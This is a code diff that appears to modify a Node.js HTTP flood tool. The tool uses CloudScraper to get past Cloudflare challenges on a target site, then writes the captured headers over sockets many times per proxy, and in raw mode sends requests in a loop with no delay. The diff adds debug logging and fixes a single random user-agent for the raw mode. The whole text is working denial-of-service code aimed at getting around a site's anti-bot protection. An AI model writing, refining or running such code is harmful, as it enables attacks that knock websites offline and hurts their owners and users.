@@ -38,6 +38,7 @@ function send_req_proxy() {
                 //console.log(error)
                 return start();
             }
+			//console.log(response)
             let headers = '';
             Object.keys(response.request.headers).forEach(function (i, e) {
                 if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
@@ -57,7 +58,8 @@ function send_req_proxy() {
         for (let i = 0; i < req_per_ip; ++i) {
             client.write(headers)
         }
-        client.on('data', function () {
+        client.on('data', function (data) {
+			//console.log(''+data)
             setTimeout(function () {
                 client.destroy();
                 return delete client;
@@ -65,18 +67,19 @@ function send_req_proxy() {
         });
     });
 }
-function send_req_raw() {
+function send_req_raw(useragent) {
     let getHeaders = new Promise(function (resolve, reject) {
         CloudScraper({
             uri: target,
             resolveWithFullResponse: true,
             challengesToSolve: 10,
-            headers: {'User-Agent':random_useragent.getRandom()}
+            headers: {'User-Agent': useragent}
         }, function (error, response) {
             if (error) {
                 //console.log(error)
                 return start();
             }
+			//console.log(response)
             let headers = '';
             Object.keys(response.request.headers).forEach(function (i, e) {
                 if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
@@ -110,8 +113,9 @@ function run(){
             send_req_proxy();
         });
     } else if (proxymode == 'off') {
+		var useragent = random_useragent.getRandom()
         setInterval(() => {
-            send_req_raw();
+            send_req_raw(useragent);
         });
     } else {
         console.log('on/off')
